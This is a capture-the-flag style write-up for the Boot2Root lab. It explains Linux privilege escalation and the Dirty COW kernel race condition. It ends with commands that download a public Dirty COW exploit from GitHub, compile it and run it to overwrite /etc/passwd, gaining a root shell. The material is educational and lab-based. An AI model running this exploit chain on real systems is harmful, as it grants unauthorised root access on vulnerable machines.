

# Boot2Root 

## Privelege Escalation

Once connected as `laurie` our goal is to become `root`. The techniques used to become root or an higer priveleged user on a machine are called `privelege escalation`. Finding informations about it is super easy, there a lot of documentations and even some scripts to the job for you like [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) or [LinEnum](https://github.com/rebootuser/LinEnum). 
 </br>

Some techinques are oriented on users permissions, misconfiguration or configuration weaknesses and even OS and kernel oriented. Each time that you find an application or software take a look at the version and verify if a `Common Vulnerabilities and Exposures (CVE)` exists. Some sites store and index them like [CVEDetails](https://www.cvedetails.com/) some other store scripts to exploit these CVEs like [exploitDB](https://www.exploit-db.com/).


## DirtyCow

After some infomations gathering and a lot of failures, we find that the kernel version of the machine is old:
```
laurie@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 athlon i386 GNU/Linux
```
This version is `3.2` but the current one is `6.16`. </br>
While researching privilege escalation on Linux, some CVEs kept appearing in the search results. One of them, called [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW), exploits the Linux kernel to gain root privileges.
</br>


### What is Dirty COW ?

References: 
- https://github.com/thaddeuspearson/Understanding_DirtyCOW
- https://www.youtube.com/watch?v=kEsshExn7aE
- https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/demo.html

Dirty Copy-On-Write (COW) is a vulnerability affecting Linux Kernel Versions 2.6.22 - 4.8.3. With this vulnerability, it is possible for an attacker to escalate their privilege via a race condition due to a problem in the way the Linux Kernel handles memory-management.


### What is a Race Condition ?

A race condition occurs when two or more threads can access the same shared data and then try to change that data at the same time, and unexpected results occur. As an example, consider two ATM machines. Both have access to the same bank account, and both can be accessed independently. If two people were to access the same bank account at the same exact time, and both withdrew $100, the bank account should treat both of these transactions as separate and reduce the balance of the bank acount by $200. However, if the memory is not being managed appropriately, it is theoretically possible that if both withdrawals happened at the same exact time, the bank account may only register one transaction, giving the people a free $100 bill.

### How it works ?

1. First a read-only file is opened like `/etc/passwd`
2. The file is then mapped in logical memory with `mmap` (still in read-only)
3. Finally 2 threads are launched. 
- The first one tells the kernel that the file mapped in memory is no longer used. 
- The second thread writes on the copy in the logical memory.  </br>
What happens next is that we continuously write on the copy of the file and "free" it. 
Because write can continue to perform current operations even in a context switching, like threads plus the fact that copy-on-write take a little bit of time, then some characters will be written in the original file.  </br>

By targeting a file like `/etc/passwd` we can overwrite the `UID` of an user giving him root priveleges.

```
curl https://raw.githubusercontent.com/firefart/dirtycow/refs/heads/master/dirty.c -o dirty.c

gcc -pthread dirty.c -o dirty -lcrypt

./dirty password

su toor
password: passowrd

id
uid=0(toor) gid=0(root) groups=0(root)
```